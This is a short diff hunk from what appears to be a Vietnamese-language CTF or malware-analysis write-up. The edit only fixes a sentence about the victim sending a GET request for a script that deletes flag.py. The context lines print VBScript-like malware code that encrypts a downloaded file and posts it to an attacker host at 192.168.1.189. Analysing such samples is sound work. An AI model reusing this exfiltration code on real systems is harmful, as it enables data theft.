@@ -679,7 +679,7 @@ Ohm = ""
 Ohm = crypthelper(download_file(), ay, True)
 rul = requestpage("http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ", chr(34) & Ohm & chr(34))
 
--> Lúc này nhận được file flag.py ở server, sau đó victim nhận request GET 1 script xóa file flag.py
+-> Lúc này nhận được file flag.py ở server, sau đó victim gửi request GET 1 script xóa file flag.py
 
 Function delete_file()
 	On error resume next
